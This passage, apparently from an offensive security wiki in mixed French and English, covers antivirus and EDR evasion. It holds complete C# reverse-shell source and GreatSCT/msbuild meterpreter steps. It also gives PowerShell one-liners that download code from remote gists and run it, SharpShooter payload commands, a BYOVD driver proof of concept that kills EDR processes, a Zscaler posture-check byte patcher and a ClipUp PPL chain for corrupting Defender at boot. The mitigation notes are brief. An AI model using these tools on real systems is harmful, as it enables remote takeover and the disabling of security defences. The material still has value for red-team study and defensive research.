**WARNING:** To maintain stealth you must not do a few things

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le listener** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le defender actuel va terminer le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de python pour build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutraliser AV/EDR depuis l'espace noyau

Storm-2603 a utilisé un petit utilitaire console connu sous le nom d'Antivirus Terminator pour désactiver les protections endpoint avant de déployer du ransomware. L'outil apporte **son propre driver vulnérable mais *signé*** et l'abuse pour émettre des opérations privilégiées au niveau noyau que même les services AV en Protected-Process-Light (PPL) ne peuvent bloquer.

Key take-aways
1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`, but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”. Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **kernel service** et la seconde le démarre, de sorte que `\\.\ServiceMouse` devient accessible depuis l'espace utilisateur.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
| `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
| `0x990001D0` | Décharger le driver et supprimer le service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD évite complètement les protections en espace utilisateur ; du code s'exécutant dans le noyau peut ouvrir des processus *protégés*, les terminer, ou altérer des objets noyau indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Detection / Mitigation
•  Activez la liste de blocage des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux services *kernel* et alertez lorsqu'un driver est chargé depuis un répertoire inscriptible par tous (world-writable) ou n'est pas présent dans la liste d'autorisation.  
•  Surveillez les handles en mode utilisateur vers des objets de périphérique personnalisés suivis d'appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applique les règles de posture d'appareil localement et s'appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L'évaluation de la posture se fait **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes ne valident que le fait que l'exécutable se connectant est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1`, donc chaque vérification est conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ tout processus (même non signé) peut se lier aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Court-circuités |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la stack de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Les binaires non signés ou modifiés peuvent ouvrir les named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas démontre comment des décisions de confiance purement côté client et des vérifications de signature simples peuvent être contournées avec quelques patchs d'octets.

## Abuser Protected Process Light (PPL) pour altérer AV/EDR avec LOLBINs

Protected Process Light (PPL) impose une hiérarchie signataire/niveau de sorte que seuls les processus protégés de niveau égal ou supérieur peuvent s'altérer entre eux. Offensivement, si vous pouvez lancer légitimement un binaire activé PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (e.g., logging) en une primitive d'écriture restreinte, soutenue par le PPL, visant des répertoires protégés utilisés par AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier de log vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier se fait avec le support PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour viser des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Obtenir le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (par ex., CreateProcessAsPPL).
2) Passer l'argument de chemin de log de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par ex., Defender Platform). Utiliser les noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant son exécution (par ex., MsMpEng.exe), planifier l'écriture au démarrage avant que l'AV ne démarre en installant un service auto-démarré qui s'exécute plus tôt de manière fiable. Valider l'ordre de démarrage avec Process Monitor (boot logging).
4) Au reboot, l'écriture soutenue par PPL a lieu avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Remarques et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de l'emplacement ; la primitive convient mieux à la corruption qu'à une injection précise de contenu.
- Nécessite des droits admin locaux/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier parenté par des lanceurs non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Investiguer la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance de l'intégrité des fichiers sur les binaires/les répertoires Platform de Defender ; créations/modifications de fichiers inattendues par des processus avec des flags protected-process.
- Télémétrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale du niveau PPL par des binaires non-AV.

Mesures d'atténuation
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : restreindre la création/modification de services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- S'assurer que la protection contre la falsification de Defender et les protections de lancement précoce sont activées ; investiguer les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester minutieusement).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
